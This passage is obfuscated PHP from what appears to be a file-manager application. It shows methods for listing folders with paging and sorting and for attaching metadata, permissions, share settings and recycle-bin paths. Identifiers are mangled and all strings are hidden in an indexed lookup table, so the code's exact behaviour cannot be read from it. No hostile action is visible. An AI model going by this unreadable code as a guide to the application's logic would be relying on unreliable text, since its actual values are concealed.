$this->field($Âì)->_makeOrder()->where($“İÇå‚)->selectPage($¸¸å­Ò©); $this->_listPageCheck($¤œ, $Âì, $“İÇå‚); $this->_listDataApply($¤œ[$©²Â‚²ƒ”[367]]); $this->_listMake($¤œ); return $¤œ; } private function _listPageCheck(&$à¿É½ºöÙ—ã, $ ¤„“Ş, $æÕÛé¨) { $¢™ê‘ªúüÄ¬ =& $_SERVER[èÍ×öˆøÉ]; if (!is_array($à¿É½ºöÙ—ã[$¢™ê‘ªúüÄ¬[364]])) { return; } $ €æ = $à¿É½ºöÙ—ã[$¢™ê‘ªúüÄ¬[364]]; if ($ €æ[$¢™ê‘ªúüÄ¬[366]] <= 1) { return; } if ($ €æ[$¢™ê‘ªúüÄ¬[365]] >= 100000) { return; } if (Model($¢™ê‘ªúüÄ¬[427])->get($¢™ê‘ªúüÄ¬[428]) != $¢™ê‘ªúüÄ¬[429]) { return; } $ ¤„“Ş = str_replace(array($¢™ê‘ªúüÄ¬[50], $¢™ê‘ªúüÄ¬[340], $¢™ê‘ªúüÄ¬[229]), $¢™ê‘ªúüÄ¬[33], $ ¤„“Ş); $ ¤„“Ş = $¢™ê‘ªúüÄ¬[430] . str_replace($¢™ê‘ªúüÄ¬[47], $¢™ê‘ªúüÄ¬[431], $ ¤„“Ş) . $¢™ê‘ªúüÄ¬[432]; $ù¾ = $¢™ê‘ªúüÄ¬[433]; $ù¾ = $ù¾ . $¢™ê‘ªúüÄ¬[434]; $‹¦ = $ €æ[$¢™ê‘ªúüÄ¬[361]] * ($ €æ[$¢™ê‘ªúüÄ¬[351]] - 1) . $¢™ê‘ªúüÄ¬[47] . $ €æ[$¢™ê‘ªúüÄ¬[361]]; $ô›¾ØéÈŠÈ¤ = $this->_makeOrder(!0); $ÆŒî = $¢™ê‘ªúüÄ¬[430] . str_replace($¢™ê‘ªúüÄ¬[47], $¢™ê‘ªúüÄ¬[431], $ô›¾ØéÈŠÈ¤[0]); if (strpos($ÆŒî, $¢™ê‘ªúüÄ¬[435])) { $ÆŒî = str_replace($¢™ê‘ªúüÄ¬[435], $¢™ê‘ªúüÄ¬[436], $ÆŒî); } else { $ÆŒî .= $¢™ê‘ªúüÄ¬[437] . $ô›¾ØéÈŠÈ¤[1]; } $Ëşœ = array(); foreach ($æÕÛé¨ as $¼•Œû => $ç‰ˆ) { $Ëşœ[$¢™ê‘ªúüÄ¬[430] . $¼•Œû] = $ç‰ˆ; } $this->alias($¢™ê‘ªúüÄ¬[438])->field($ ¤„“Ş)->limit($‹¦)->order($ÆŒî); $®Ó¤¬Ù°Œê = $this->join($ù¾)->where($Ëşœ)->select(); if ($®Ó¤¬Ù°Œê) { $à¿É½ºöÙ—ã[$¢™ê‘ªúüÄ¬[367]] = $®Ó¤¬Ù°Œê; } } protected function _makeOrder($ÏĞáàœÓ·ç = false) { $åÙ³¥ç— =& $_SERVER[èÍ×öˆøÉ]; $´×áüã = Model($åÙ³¥ç—[439])->get($åÙ³¥ç—[440]); $ôÍô×½áâĞ = Model($åÙ³¥ç—[439])->get($åÙ³¥ç—[441]); $Ú = array($åÙ³¥ç—[442] => $åÙ³¥ç—[443], $åÙ³¥ç—[444] => $åÙ³¥ç—[445]); $ïşÊ“àˆ = array($åÙ³¥ç—[28] => $åÙ³¥ç—[28], $åÙ³¥ç—[78] => $åÙ³¥ç—[78], $åÙ³¥ç—[168] => $åÙ³¥ç—[407], $åÙ³¥ç—[446] => $åÙ³¥ç—[446], $åÙ³¥ç—[447] => $åÙ³¥ç—[448], $åÙ³¥ç—[194] => $åÙ³¥ç—[194], $åÙ³¥ç—[84] => $åÙ³¥ç—[84]); $©áªë•€ = Input::get($åÙ³¥ç—[449], $åÙ³¥ç—[7], $´×áüã, array_keys($ïşÊ“àˆ)); $µ‹›½ó = Input::get($åÙ³¥ç—[450], $åÙ³¥ç—[7], $ôÍô×½áâĞ, array_keys($Ú)); if (!in_array($©áªë•€, array_keys($ïşÊ“àˆ))) { $©áªë•€ = $åÙ³¥ç—[28]; } if (!in_array($µ‹›½ó, array_keys($Ú))) { $©áªë•€ = $åÙ³¥ç—[442]; } if ($©áªë•€ == $åÙ³¥ç—[28]) { } $§Äó¶’ = $åÙ³¥ç—[451] . $ïşÊ“àˆ[$©áªë•€] . $åÙ³¥ç—[50] . $Ú[$µ‹›½ó]; $§Äó¶’ = rtrim(trim($§Äó¶’), $åÙ³¥ç—[47]); if ($ÏĞáàœÓ·ç) { return array($§Äó¶’, $Ú[$µ‹›½ó]); } return $this->order($§Äó¶’); } protected function _listDataApplyItem($ÅÆçï, $™”ôİŸà = false) { $š¾¸¹ = array($ÅÆçï); $this->_listDataApply($š¾¸¹, $™”ôİŸà); return $š¾¸¹[0]; } protected function _listDataApply(&$‰¶µ, $«•İõ’ğØ = false) { $­ =& $_SERVER[èÍ×öˆøÉ]; if (!$‰¶µ) { $‰¶µ = array(); return; } $Ê¢ÔºİßÉÎ¸º = array_to_keyvalue($‰¶µ, $­[33], $­[397]); $Ê¢ÔºİßÉÎ¸º = array_unique($Ê¢ÔºİßÉÎ¸º); $this->_listSourceCache($‰¶µ); if (!$«•İõ’ğØ) { $this->_listAppendMeta($‰¶µ, $Ê¢ÔºİßÉÎ¸º); $this->_listAppendFileMeta($‰¶µ, $Ê¢ÔºİßÉÎ¸º); $this->_listAppendChildren($‰¶µ, $Ê¢ÔºİßÉÎ¸º); } $this->_listAppendPath($‰¶µ); $this->_listAppendAuth($‰¶µ); $this->_listAppendSourceInfo($‰¶µ, $Ê¢ÔºİßÉÎ¸º); $this->_listAppendUser($‰¶µ); $this->_listFilterInfo($‰¶µ, $«•İõ’ğØ); $this->_listAppendAuthSecret($‰¶µ); } protected function _listSourceCache($å‘) { $™ŠÕ =& $_SERVER[èÍ×öˆøÉ]; foreach ($å‘ as $‡ÅßÙ­³Ò) { self::$cacheSourceInfo[$™ŠÕ[452] . $‡ÅßÙ­³Ò[$™ŠÕ[397]]] = $‡ÅßÙ­³Ò; } } protected function _listFilterInfo(&$¡öÑãüÙ¼ƒÊ, $•Ç©Óá°Â = false) { $Ÿ¬ä± =& $_SERVER[èÍ×öˆøÉ]; foreach ($¡öÑãüÙ¼ƒÊ as &$ù²) { $ù² = $this->pathInfoFilter($ù²); self::$cachePathInfo[$Ÿ¬ä±[453] . intval($•Ç©Óá°Â) . $Ÿ¬ä±[454] . $ù²[$Ÿ¬ä±[397]]] = $ù²; } unset($ù²); } protected function _listMake(&$ì”öò‡) { $¼¦ =& $_SERVER[èÍ×öˆøÉ]; $ì”öò‡[$¼¦[75]] = array(); $ì”öò‡[$¼¦[74]] = array(); foreach ($ì”öò‡[$¼¦[367]] as $ŞşŒ‹à…ø) { $Á„ = $ŞşŒ‹à…ø[$¼¦[405]] == 1 ? $¼¦[75] : $¼¦[74]; $ì”öò‡[$Á„][] = $ŞşŒ‹à…ø; } unset($ì”öò‡[$¼¦[367]]); } protected function _listAppendMeta(&$¬–’ãŒØ¿†‰, $Ú½š×) { $‹Ö™ıß«–Ô =& $_SERVER[èÍ×öˆøÉ]; $ıœ„¨ñ = array($‹Ö™ıß«–Ô[412] => array($‹Ö™ıß«–Ô[413], $Ú½š×)); $¥èëÄ = Model($‹Ö™ıß«–Ô[455])->field($‹Ö™ıß«–Ô[456])->where($ıœ„¨ñ)->select(); if (!$¥èëÄ) { return; } $û³º¼Ô³Ü˜ = array($‹Ö™ıß«–Ô[457], $‹Ö™ıß«–Ô[458], $‹Ö™ıß«–Ô[436]); $ÓºÍè = array(); foreach ($¥èëÄ as $ÊëÂ) { if (!isset($ÓºÍè[$ÊëÂ[$‹Ö™ıß«–Ô[397]]])) { $ÓºÍè[$ÊëÂ[$‹Ö™ıß«–Ô[397]]] = array(); } if (in_array($ÊëÂ[$‹Ö™ıß«–Ô[93]], $û³º¼Ô³Ü˜)) { continue; } $ÓºÍè[$ÊëÂ[$‹Ö™ıß«–Ô[397]]][$ÊëÂ[$‹Ö™ıß«–Ô[93]]] = $ÊëÂ[$‹Ö™ıß«–Ô[372]]; } foreach ($¬–’ãŒØ¿†‰ as &$»‰ûæø–¿ Ğ) { $»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[459]] = !1; if (isset($ÓºÍè[$»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[397]]])) { $»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[459]] = $ÓºÍè[$»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[397]]]; } if ($this->fileIsLock($»‰ûæø–¿ Ğ) && $»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[408]]) { $Ì®‘º£ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[408]][$‹Ö™ıß«–Ô[409]] = AuthModel::authDisable($»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[408]][$‹Ö™ıß«–Ô[409]], $Ì®‘º£); $»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[408]][$‹Ö™ıß«–Ô[460]][$‹Ö™ıß«–Ô[408]] = $»‰ûæø–¿ Ğ[$‹Ö™ıß«–Ô[408]][$‹Ö™ıß«–Ô[409]]; } } unset($»‰ûæø–¿ Ğ); } protected function _listAppendFileMeta(&$¾Ù , $ÅÔ) { $Üš =& $_SERVER[èÍ×öˆøÉ]; $ÒÆˆî‡÷• = array_to_keyvalue($¾Ù , $Üš[33], $Üš[461]); $ÒÆˆî‡÷• = array_filter(array_unique($ÒÆˆî‡÷•)); if (!$ÒÆˆî‡÷•) { return; } $ÈË = array($Üš[462] => array($Üš[413], $ÒÆˆî‡÷•)); $®ŸñÕ = $Üš[463]; $„ÙÇ§ = Model($Üš[464])->field($®ŸñÕ)->where($ÈË)->select(); $„ÙÇ§ = array_to_keyvalue($„ÙÇ§, $Üš[461]); $÷ = Model($Üš[465])->field($Üš[466])->where($ÈË)->select(); $÷ = $÷ ? $÷ : array(); $ÛÉˆ¦ = array(); foreach ($÷ as $Ê³³ù±ÓÕÅ) { if (!isset($ÛÉˆ¦[$Ê³³ù±ÓÕÅ[$Üš[461]]])) { $ÛÉˆ¦[$Ê³³ù±ÓÕÅ[$Üš[461]]] = array(); } $ÛÉˆ¦[$Ê³³ù±ÓÕÅ[$Üš[461]]][$Ê³³ù±ÓÕÅ[$Üš[93]]] = $Ê³³ù±ÓÕÅ[$Üš[372]]; } foreach ($¾Ù  as &$ªò’Á) { $œ¿İ„ô£Ú¼ = $ªò’Á[$Üš[461]]; if (!$œ¿İ„ô£Ú¼ || !is_array($„ÙÇ§[$œ¿İ„ô£Ú¼])) { continue; } $ÉæÖÑà×Ö‡ = $„ÙÇ§[$œ¿İ„ô£Ú¼]; $ÉæÖÑà×Ö‡[$Üš[78]] = $ªò’Á[$Üš[78]]; $ÉæÖÑà×Ö‡[$Üš[28]] = $ªò’Á[$Üš[28]]; if (!isset(self::$cacheFileInfo[$Üš[467] . $œ¿İ„ô£Ú¼])) { self::$cacheFileInfo[$Üš[467] . $œ¿İ„ô£Ú¼] = array_merge(array(), $ÉæÖÑà×Ö‡); } unset($„ÙÇ§[$œ¿İ„ô£Ú¼][$Üš[76]]); $õ = is_array($ÛÉˆ¦[$œ¿İ„ô£Ú¼]) ? $ÛÉˆ¦[$œ¿İ„ô£Ú¼] : array(); $ªò’Á[$Üš[164]] = array_merge($õ, $„ÙÇ§[$œ¿İ„ô£Ú¼]); if (isset($ªò’Á[$Üš[164]][$Üš[163]])) { $ªò’Á[$Üš[163]] = json_decode($ªò’Á[$Üš[164]][$Üš[163]], !0); unset($ªò’Á[$Üš[164]][$Üš[163]]); } } unset($ªò’Á); } protected function _listAppendSourceInfo(&$£İó´¡¶å, $µ÷¾Í) { $ØÎ††Î©‰ÓŒ =& $_SERVER[èÍ×öˆøÉ]; if (!defined($ØÎ††Î©‰ÓŒ[468])) { return; } $ñô¾‡·ôÎç— = Model($ØÎ††Î©‰ÓŒ[469])->listData(); $€è•ÅõÃà = Model($ØÎ††Î©‰ÓŒ[420])->listData(); $ı€Û£Á = Model($ØÎ††Î©‰ÓŒ[410])->listData(); $‡ò…»› = Model($ØÎ††Î©‰ÓŒ[470])->listSimple(); $ã = array_to_keyvalue($ñô¾‡·ôÎç—, $ØÎ††Î©‰ÓŒ[395]); $¿“Æ¾ÓÇ = array_to_keyvalue_group($€è•ÅõÃà, $ØÎ††Î©‰ÓŒ[76], $ØÎ††Î©‰ÓŒ[421]); $¦Ò = array_to_keyvalue($ı€Û£Á, $ØÎ††Î©‰ÓŒ[76]); $šäÊõ = array_to_keyvalue_group($‡ò…»›, $ØÎ††Î©‰ÓŒ[397]); foreach ($£İó´¡¶å as &$³Ö²µ¦Èü©¹³) { $³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[85]] = array($ØÎ††Î©‰ÓŒ[471] => 0, $ØÎ††Î©‰ÓŒ[472] => 0, $ØÎ††Î©‰ÓŒ[473] => 0); if (isset($¦Ò[$³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[397]]])) { $³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[85]][$ØÎ††Î©‰ÓŒ[474]] = 1; $³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[85]][$ØÎ††Î©‰ÓŒ[475]] = $¦Ò[$³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[397]]][$ØÎ††Î©‰ÓŒ[28]]; } if (isset($¿“Æ¾ÓÇ[$³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[397]]])) { $³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[85]][$ØÎ††Î©‰ÓŒ[476]] = array(); foreach ($¿“Æ¾ÓÇ[$³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[397]]] as $Ğ†á) { $ˆÎŠ˜¾Õìà€ç = $ã[$Ğ†á]; $³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[85]][$ØÎ††Î©‰ÓŒ[476]][] = array($ØÎ††Î©‰ÓŒ[477] => $ˆÎŠ˜¾Õìà€ç[$ØÎ††Î©‰ÓŒ[395]], $ØÎ††Î©‰ÓŒ[415] => $ˆÎŠ˜¾Õìà€ç[$ØÎ††Î©‰ÓŒ[28]], $ØÎ††Î©‰ÓŒ[478] => $ˆÎŠ˜¾Õìà€ç[$ØÎ††Î©‰ÓŒ[479]]); } } if (isset($šäÊõ[$³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[397]]])) { $³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[85]][$ØÎ††Î©‰ÓŒ[480]] = array(); foreach ($šäÊõ[$³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[397]]] as $Ìä¡) { $³Ö²µ¦Èü©¹³[$ØÎ††Î©‰ÓŒ[85]][$ØÎ††Î©‰ÓŒ[480]] = array($ØÎ††Î©‰ÓŒ[481] => $Ìä¡[$ØÎ††Î©‰ÓŒ[482]], $ØÎ††Î©‰ÓŒ[483] => $Ìä¡[$ØÎ††Î©‰ÓŒ[484]], $ØÎ††Î©‰ÓŒ[485] => $Ìä¡[$ØÎ††Î©‰ÓŒ[397]], $ØÎ††Î©‰ÓŒ[486] => $Ìä¡[$ØÎ††Î©‰ÓŒ[487]], $ØÎ††Î©‰ÓŒ[488] => $Ìä¡[$ØÎ††Î©‰ÓŒ[489]], $ØÎ††Î©‰ÓŒ[490] => $Ìä¡[$ØÎ††Î©‰ÓŒ[490]], $ØÎ††Î©‰ÓŒ[491] => $Ìä¡[$ØÎ††Î©‰ÓŒ[491]]); } } } unset($³Ö²µ¦Èü©¹³); return $£İó´¡¶å; } protected function _listAppendChildren(&$ÕïŒ¸ï¼ãº, $éó) { $ØåÊãÆô =& $_SERVER[èÍ×öˆøÉ]; $Ãé™œ… = array(); $òÜ æ¼ê = array($ØåÊãÆô[203] => 0, $ØåÊãÆô[204] => 0); foreach ($ÕïŒ¸ï¼ãº as &$ç) { if (!$ç[$ØåÊãÆô[405]]) { continue; } $Ãé™œ…[] = $ç[$ØåÊãÆô[397]]; } unset($ç); if (!$Ãé™œ…) { return; } $±ä µ´ = array($ØåÊãÆô[492] => array($ØåÊãÆô[7], $Ãé™œ…)); $¥ÖÎª›¿ = array($ØåÊãÆô[492], $ØåÊãÆô[405], $ØåÊãÆô[493] => $ØåÊãÆô[494]); $×¸¶ = $this->field($¥ÖÎª›¿)->where($±ä µ´)->group($ØåÊãÆô[495])->select(); $‘îõµ™à‘ = array(); foreach ($×¸¶ as $ÍÂ·ËàÅ) { $Ğ™ = $ÍÂ·ËàÅ[$ØåÊãÆô[492]]; $’ÕÉ¦ù§Ç = $ÍÂ·ËàÅ[$ØåÊãÆô[405]] == $ØåÊãÆô[87] ? $ØåÊãÆô[204] : $ØåÊãÆô[203]; if (!isset($‘îõµ™à‘[$Ğ™])) { $‘îõµ™à‘[$Ğ™] = array($ØåÊãÆô[203] => 0, $ØåÊãÆô[204] => 0); } $‘îõµ™à‘[$Ğ™][$’ÕÉ¦ù§Ç] += $ÍÂ·ËàÅ[$ØåÊãÆô[494]]; } foreach ($ÕïŒ¸ï¼ãº as &$ç) { if (!$ç[$ØåÊãÆô[405]]) { continue; } $‚¡ = is_array($‘îõµ™à‘[$ç[$ØåÊãÆô[397]]]) ? $‘îõµ™à‘[$ç[$ØåÊãÆô[397]]] : $òÜ æ¼ê; $ç[$ØåÊãÆô[204]] = $‚¡[$ØåÊãÆô[204]]; $ç[$ØåÊãÆô[203]] = $‚¡[$ØåÊãÆô[203]]; unset($ç[$ØåÊãÆô[407]]); } unset($ç); } protected function _listAppendAuth(&$­·’ÕÙ­ÙŒµ) { $å»Öêºç„ =& $_SERVER[èÍ×öˆøÉ]; if (!defined($å»Öêºç„[468])) { return; } $ƒº‰ÙÛÍä½ = array(); foreach ($­·’ÕÙ­ÙŒµ as $ÌàƒÅ®«”) { if ($ÌàƒÅ®«”[$å»Öêºç„[406]] == self::TYPE_GROUP) { $ƒº‰ÙÛÍä½[] = $ÌàƒÅ®«”[$å»Öêºç„[397]]; } } if (!$ƒº‰ÙÛÍä½) { return; } $ÊÆ×¤³İ¾ = array_to_keyvalue($­·’ÕÙ­ÙŒµ, $å»Öêºç„[397]); $€”­’Ù = Model($å»Öêºç„[496])->getSourceList($ƒº‰ÙÛÍä½, $ÊÆ×¤³İ¾); foreach ($­·’ÕÙ­ÙŒµ as $È¯ÀŞ => &$ÌàƒÅ®«”) { $ÌàƒÅ®«”[$å»Öêºç„[408]] = $€”­’Ù[$ÌàƒÅ®«”[$å»Öêºç„[397]]]; if (!$ÌàƒÅ®«”[$å»Öêºç„[408]] && $ÌàƒÅ®«”[$å»Öêºç„[406]] == self::TYPE_GROUP) { $ÌàƒÅ®«”[$å»Öêºç„[408]] = Action($å»Öêºç„[497])->pathGroupAuthMake($ÌàƒÅ®«”[$å»Öêºç„[498]]); if (!$ÌàƒÅ®«”[$å»Öêºç„[408]] && !_get($GLOBALS, $å»Öêºç„[499])) { $ÌàƒÅ®«”[$å»Öêºç„[196]] = !1; $ÌàƒÅ®«”[$å»Öêºç„[195]] = !1; } } if ($ÌàƒÅ®«”[$å»Öêºç„[408]]) { $ÌàƒÅ®«”[$å»Öêºç„[196]] = AuthModel::authCheckEdit($ÌàƒÅ®«”[$å»Öêºç„[408]][$å»Öêºç„[409]]); $ÌàƒÅ®«”[$å»Öêºç„[195]] = AuthModel::authCheckView($ÌàƒÅ®«”[$å»Öêºç„[408]][$å»Öêºç„[409]]); } $this->groupPathDisplay($ÌàƒÅ®«”); } unset($ÌàƒÅ®«”); } public function _listAppendAuthSecret(&$Ë») { $ä£õª =& $_SERVER[èÍ×öˆøÉ]; if (Model($ä£õª[427])->get($ä£õª[500]) != $ä£õª[87]) { return; } static $’’‚İÄ’Î = false; if (!$’’‚İÄ’Î) { $°·Ì²„ = Model($ä£õª[501]); $·Ä†ŞªÃÍÑçâ = Model($ä£õª[502]); $’’‚İÄ’Î = $·Ä†ŞªÃÍÑçâ->listData(); $’’‚İÄ’Î = array_to_keyvalue($’’‚İÄ’Î, $ä£õª[397]); $Ç¤¡± = json_decode(Model($ä£õª[427])->get($ä£õª[503]), !0); $Ç¤¡± = array_to_keyvalue($Ç¤¡±, $ä£õª[395]); foreach ($’’‚İÄ’Î as $á  => $éúğú†“¸ÚÏû) { $›Á¯¼í§ì = $Ç¤¡±[$éúğú†“¸ÚÏû[$ä£õª[504]]]; if (!$›Á¯¼í§ì) { $·Ä†ŞªÃÍÑçâ->remove($éúğú†“¸ÚÏû[$ä£õª[395]]); unset($’’‚İÄ’Î[$á ]); continue; } $îä = $°·Ì²„->listData($›Á¯¼í§ì[$ä£õª[408]]); if (!$îä) { $·Ä†ŞªÃÍÑçâ->remove($éúğú†“¸ÚÏû[$ä£õª[395]]); unset($’’‚İÄ’Î[$á ]); continue; } $éúğú†“¸ÚÏû[$ä£õª[408]] = $îä; $éúğú†“¸ÚÏû[$ä£õª[505]] = $›Á¯¼í§ì; $éúğú†“¸ÚÏû[$ä£õª[506]] = Model($ä£õª[507])->getInfoSimpleOuter($éúğú†“¸ÚÏû[$ä£õª[446]]); $’’‚İÄ’Î[$á ] = $éúğú†“¸ÚÏû; } } $¡ÖÎ‡Œ = defined($ä£õª[508]) ? USER_ID : $ä£õª[33]; $õšÚ†¥® = array(); $¡ı = $this->_listAppendPath($õšÚ†¥®, !0); foreach ($Ë» as $á  => &$éúğú†“¸ÚÏû) { if (!is_array($éúğú†“¸ÚÏû[$ä£õª[408]])) { continue; } if ($éúğú†“¸ÚÏû[$ä£õª[406]] != $ä£õª[509]) { continue; } if (isset($’’‚İÄ’Î[$éúğú†“¸ÚÏû[$ä£õª[397]]])) { $¨É‹¿¢ = $’’‚İÄ’Î[$éúğú†“¸ÚÏû[$ä£õª[397]]]; if (!is_array($éúğú†“¸ÚÏû[$ä£õª[459]])) { $éúğú†“¸ÚÏû[$ä£õª[459]] = array(); } $éúğú†“¸ÚÏû[$ä£õª[459]][$ä£õª[510]] = $¨É‹¿¢[$ä£õª[504]]; $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[511]] = $¨É‹¿¢; $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[512]] = $éúğú†“¸ÚÏû[$ä£õª[513]]; $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[514]] = $ä£õª[87]; if ($¨É‹¿¢[$ä£õª[446]] != $¡ÖÎ‡Œ) { $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[409]] = $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[409]] & $¨É‹¿¢[$ä£õª[408]][$ä£õª[408]]; } continue; } $Ö¢«½á = $this->parentLevelArray($éúğú†“¸ÚÏû[$ä£õª[515]]); $½µ‡’ = array_reverse($Ö¢«½á); foreach ($½µ‡’ as $Õ„Â­øĞ => $½Š) { if (!isset($’’‚İÄ’Î[$½Š])) { continue; } $¨É‹¿¢ = $’’‚İÄ’Î[$½Š]; $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[511]] = $¨É‹¿¢; if ($¨É‹¿¢[$ä£õª[446]] != $¡ÖÎ‡Œ) { $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[409]] = $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[409]] & $¨É‹¿¢[$ä£õª[408]][$ä£õª[408]]; } $ĞÉ¾´İ¸Ş£Š = $ä£õª[33]; $ÎÂ˜ = count($Ö¢«½á) - $Õ„Â­øĞ; for ($ŒÜØÜãŞšóğ = 0; $ŒÜØÜãŞšóğ < $ÎÂ˜; $ŒÜØÜãŞšóğ++) { if (!isset($¡ı[$Ö¢«½á[$ŒÜØÜãŞšóğ]])) { $ĞÉ¾´İ¸Ş£Š = $ä£õª[33]; break; } $ĞÉ¾´İ¸Ş£Š = $ĞÉ¾´İ¸Ş£Š . rtrim($¡ı[$Ö¢«½á[$ŒÜØÜãŞšóğ]], $ä£õª[8]) . $ä£õª[8]; } $éúğú†“¸ÚÏû[$ä£õª[408]][$ä£õª[512]] = rtrim($ĞÉ¾´İ¸Ş£Š, $ä£õª[8]) . $ä£õª[8]; break; } } unset($éúğú†“¸ÚÏû); } public function groupPathDisplay(&$„“¢ÔÖî) { $ß =& $_SERVER[èÍ×öˆøÉ]; if ($„“¢ÔÖî[$ß[406]] != self::TYPE_GROUP) { return; } $ØƒÄ™¸¸£›üÃ = Model($ß[516])->getInfo($„“¢ÔÖî[$ß[498]]); $…µ¯© = $this->parentLevelArray($ØƒÄ™¸¸£›üÃ[$ß[515]]); $´ÆÁµ˜±• = $ß[33]; foreach ($…µ¯© as $¯ô”¨Íè) { $ßçèĞğæ„ = Model($ß[516])->getInfo($¯ô”¨Íè); $´ÆÁµ˜±• .= $ßçèĞğæ„[$ß[85]][$ß[397]] . $ß[47]; } $„“¢ÔÖî[$ß[517]] = $ØƒÄ™¸¸£›üÃ[$ß[492]]; $„“¢ÔÖî[$ß[518]] = $ØƒÄ™¸¸£›üÃ[$ß[515]]; $„“¢ÔÖî[$ß[519]] = $ØƒÄ™¸¸£›üÃ[$ß[520]]; $„“¢ÔÖî[$ß[521]] = $´ÆÁµ˜±• . $ØƒÄ™¸¸£›üÃ[$ß[85]][$ß[397]]; } protected function _listAppendPath(&$·Ú©ì‰â§, $Şï ö¤È„½µ = false) { $€ =& $_SERVER[èÍ×öˆøÉ]; static $Î±—×‡Á€ = array(); $’ œï‘Ì§ = array(); $©®é£‹¢Ó› = array(); if ($Şï ö¤È„½µ) { return $Î±—×‡Á€; } foreach ($·Ú©ì‰â§ as &$‡—´È—) { $¶ = $‡—´È—[$€[397]]; if ($‡—´È—[$€[405]] == $€[87] && $‡—´È—[$€[492]] != 0) { $Î±—×‡Á€[$¶] = $‡—´È—[$€[28]]; } if ($‡—´È—[$€[405]] == $€[87] && $‡—´È—[$€[492]] == 0 && !isset($Î±—×‡Á€[$¶])) { $Î±—×‡Á€[$¶] = $this->_listAppendPathRoot($‡—´È—, array()); } if (isset($©®é£‹¢Ó›[$‡—´È—[$€[515]]])) { continue; } $©®é£‹¢Ó›[$‡—´È—[$€[515]]] = !0; $™Ò = $this->parentLevelArray($‡—´È—[$€[515]]); foreach ($™Ò as $°ÆŞ Î => $—÷¹€) { if (isset($Î±—×‡Á€[$—÷¹€])) { continue; } if ($°ÆŞ Î == 0) { $Î±—×‡Á€[$—÷¹€] = $this->_listAppendPathRoot($‡—´È—, $™Ò); } if ($°ÆŞ Î != 0) { $’ œï‘Ì§[] = $—÷¹€; } } } unset($‡—´È—); $’ œï‘Ì§ = array_unique($’ œï‘Ì§); if (count($’ œï‘Ì§) > 0) { $Øç = array($€[412] => array($€[413], $’ œï‘Ì§)); if (count($’ œï‘Ì§) == 1) { $«¹ë• = $this->sourceInfo($’ œï‘Ì§[0]); $“½È€ä¼óØ§¡ = is_array($«¹ë•) ? array($«¹ë•) : !1; } else { $“½È€ä¼óØ§¡ = $this->field($€[522])->where($Øç)->select(); } if (!$“½È€ä¼óØ§¡) { $“½È€ä¼óØ§¡ = array(); } foreach ($“½È€ä¼óØ§¡ as $›õ¥ñşÊĞá«Õ) { $Î±—×‡Á€[$›õ¥ñşÊĞá«Õ[$€[397]]] = $›õ¥ñşÊĞá«Õ[$€[28]]; } } $Ÿ“Æ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Ç©Î = array(); foreach ($·Ú©ì‰â§ as &$‡—´È—) { $Ì†®áË = $‡—´È—[$€[515]]; $Ù = $€[33]; if (isset($Ç©Î[$Ì†®áË])) { $Ù = $Ç©Î[$Ì†®áË]; } else { $™Ò = $this->parentLevelArray($‡—´È—[$€[515]]); foreach ($™Ò as $°ÆŞ Î => $—÷¹€) { if (isset($Î±—×‡Á€[$—÷¹€])) { $Ù .= $Î±—×‡Á€[$—÷¹€] . $€[8]; } } $Ç©Î[$Ì†®áË] = $Ù; } $Ù .= $‡—´È—[$€[28]]; if ($‡—´È—[$€[405]] == $€[87]) { $Ù .= $€[8]; } $‡—´È—[$€[513]] = str_replace($€[523], $€[8], $Ù); if ($‡—´È—[$€[492]] == $€[191]) { $‡—´È—[$€[28]] = trim($Î±—×‡Á€[$‡—´È—[$€[397]]], $€[8]); $‡—´È—[$€[513]] = $‡—´È—[$€[28]] . $€[8]; } if (intval($‡—´È—[$€[406]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($‡—´È—, $™Ò, $Ÿ“Æ); } } unset($‡—´È—); return $·Ú©ì‰â§; } private function _listAppendPathRecycle(&$¬Éí˜, $‚‘¢„§›üãÓÙ, $ŞËŒ…å) { $Š…Ş¯ñì =& $_SERVER[èÍ×öˆøÉ]; if (!in_array($ŞËŒ…å, $‚‘¢„§›üãÓÙ) && $¬Éí˜[$Š…Ş¯ñì[397]] != $ŞËŒ…å) { return; } $ = explode($Š…Ş¯ñì[8], trim($¬Éí˜[$Š…Ş¯ñì[513]], $Š…Ş¯ñì[8])); $Ù›È = implode($Š…Ş¯ñì[8], array_slice($, 2)); $¬Éí˜[$Š…Ş¯ñì[513]] = $Š…Ş¯ñì[8] . LNG($Š…Ş¯ñì[524]) . $Š…Ş¯ñì[8] . ltrim($Ù›È, $Š…Ş¯ñì[8]); $¬Éí˜[$Š…Ş¯ñì[515]] = $Š…Ş¯ñì[525] . implode($Š…Ş¯ñì[47], array_slice($‚‘¢„§›üãÓÙ, 1)) . $Š…Ş¯ñì[47]; if ($¬Éí˜[$Š…Ş¯ñì[397]] == $ŞËŒ…å) { $¬Éí˜[$Š…Ş¯ñì[515]] = 